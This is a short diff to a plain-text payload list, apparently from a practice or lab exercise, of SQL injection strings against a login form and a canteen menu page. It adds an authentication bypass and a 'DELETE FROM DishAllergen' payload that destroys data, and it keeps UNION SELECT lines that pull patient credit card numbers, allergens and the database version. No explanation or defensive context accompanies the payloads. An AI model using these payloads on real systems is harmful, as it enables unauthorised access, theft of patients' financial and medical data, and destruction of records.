@@ -1,5 +1,7 @@
 Login Form:
 
+' OR 1=1;--
+
 ' UNION SELECT patientId, creditcardnumber FROM Patients;--
 ' UNION SELECT patientId, allergen FROM PatientAllergen;--
 
@@ -8,3 +10,6 @@ Canteen Menu:
 2023-01-04' OR 1=1;--
 2023-01-04' OR date='2023-01-04';--
 2020-01-01' UNION SELECT 0, version(), '$10.00';--
+
+Delete Tables:
+';DELETE FROM DishAllergen;--
